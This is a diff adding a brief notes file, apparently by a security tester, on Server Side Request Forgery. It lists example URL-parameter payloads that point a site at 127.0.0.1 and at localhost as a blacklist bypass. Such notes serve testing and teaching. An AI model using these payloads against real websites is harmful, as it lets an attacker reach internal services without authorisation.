@@ -1,0 +1,12 @@
+Author: Pawel Werner
+e-mail: pawel.k.werner@gmail.com
+linkedin: https://www.linkedin.com/in/pawe%C5%82-werner-31b40a53/
+
+*************** Server Side Request Forgery ***************
+
+1. a.
+http://webiste.com/?url=http://127.0.0.1:1234 (service on port 1234)
+
+b. IF 127.0.0.1 is blacklisted, try:
+http://webiste.com/?url=http://localhost:1234 (service on port 1234)
+
